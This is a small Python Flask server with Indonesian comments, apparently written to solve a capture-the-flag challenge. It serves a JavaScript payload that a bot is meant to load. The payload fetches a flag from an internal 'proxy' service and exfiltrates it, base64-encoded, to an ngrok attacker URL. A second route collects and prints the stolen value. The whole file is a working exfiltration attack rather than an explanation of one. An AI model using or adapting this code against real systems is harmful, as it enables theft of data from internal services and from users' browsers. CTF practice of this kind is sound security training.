from flask import Flask, request, Response

app = Flask(__name__)

# ---- Route untuk file JS (ini yang akan di-load oleh bot) ----
@app.route("/payload.js")
def payload_js():
    # GANTI subdomain ngrok kamu di baris 'dest = ...'
    dest = "https://12b0777877c1.ngrok-free.app"   # <-- ubah ini!
    js = f"""
    // Fetch flag dari internal service, lalu exfil ke server attacker
    fetch("http://proxy/flag")
      .then(r => r.text())
      .then(t => {{
        // kirim dalam base64 biar aman di query
        fetch("{dest}/?f=" + btoa(t));
      }});
    """
    return Response(js, mimetype="text/javascript")

# ---- Endpoint leak (menerima flag dari payload.js) ----
@app.route("/")
def leak():
    b64 = request.args.get("f")
    print("[FLAG B64] =>", b64)  # akan muncul di console
    return "OK"

if __name__ == "__main__":
    # Jalankan di 0.0.0.0:8080
    app.run(host="0.0.0.0", port=8080)
